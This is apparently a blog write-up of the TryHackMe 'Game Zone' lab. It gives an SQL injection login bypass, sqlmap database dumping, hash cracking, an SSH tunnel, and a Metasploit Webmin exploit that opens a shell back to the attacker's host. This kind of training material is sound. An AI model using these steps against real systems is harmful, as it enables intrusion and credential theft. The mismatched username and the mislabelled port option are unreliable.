---
layout: post
permalink: /posts/thm/game-zone
title: "Game Zone"
---

Deploy the machine and access its web server.

![website](/assets/images/thm/game-zone/website.png)

What is the name of the large cartoon avatar holding a sniper on the forum?

![agent](/assets/images/thm/game-zone/agent.png)

We can notice there is a login form on the web site. Here is a potential place of vulnerability, as you can input your username as another SQL query. This will take the query write, place and execute it. <br />

Use `' or 1=1 -- -` as an username and leave the password field blank.

![portal](/assets/images/thm/game-zone/portal.png)

We're going to use SQLMap to dump the entire database for GameZone.
Using the page we logged into earlier, we're going point SQLMap to the game review search feature.
First we need to intercept a request made to the search feature using BurpSuite.

![burp](/assets/images/thm/game-zone/burp.png)

Save this request into a text file. We can then pass this into SQLMap to use our authenticated user session. (Right click into the Burp and Save item)

```
sqlmap -r request.txt --dbms=mysql --dump
```

-r uses the intercepted request you saved earlier <br />
--dbms tells SQLMap what type of database management system it is <br />
--dump attempts to outputs the entire database <br />

SQLMap will now try different methods and identify the one thats vulnerable. Eventually, it will output the database.

![database](/assets/images/thm/game-zone/database.png)

![db](/assets/images/thm/game-zone/db.png)

Crack the password with JohnTheRipper

```
john hash.txt --wordlist=rockyou.txt --format=Raw-SHA256
```

![john](/assets/images/thm/game-zone/john.png)

Now we have the username: adent47 and password: videogamer124 <br />
Try to SSH onto the machine

![ssh](/assets/images/thm/game-zone/ssh.png)

We will use a tool called ss to investigate sockets running on a host.

```
ss -tulpn
```

Argument	    Description <br />
-t			        Display TCP sockets <br />
-u			        Display UDP sockets <br />
-l			        Displays only listening sockets <br />
-p			        Shows the process using the socket <br />
-n			        Doesn't resolve service names <br />

![tulpn](/assets/images/thm/game-zone/tulpn.png)

We can see that a service running on port 10000 is blocked via a  firewall rule from the outside (we can see this from the IPtable list).  However, Using an SSH Tunnel we can expose the port to us (locally)!<br />
From our local machine

```
ssh -L 10000:localhost:10000 <username>@<ip>
```

![agent-ssh](/assets/images/thm/game-zone/agent-ssh.png)

Once complete, in your browser type "localhost:10000" and you can access the newly-exposed webserver.

![login](/assets/images/thm/game-zone/login.png)

Log in with credentials which we have already found.

![webmin](/assets/images/thm/game-zone/webmin.png)

Privilege Escalation with Metasploit <br />
Using the CMS dashboard version, use Metasploit to find a payload to execute against the machine.

```
search 1.580
```

We are going to use module 0 <br />
First we need to set payload

![payload](/assets/images/thm/game-zone/payload.png)

We are going to use payload 5 <br />

Now we can set our options. Because we are attacking localhost:10000 we need to set RHOSTS to localhost not to the machine ip. Also we have to set SSL to false because we are not going to use https. RHOSTS by default is 10000 so we don't need to set it.

```
set PASSWORD videogamer124
set RHOSTS localhost
set SSL false
set USERNAME agent47
set LHOST 10.9.5.60
run
```

![root](/assets/images/thm/game-zone/root.png)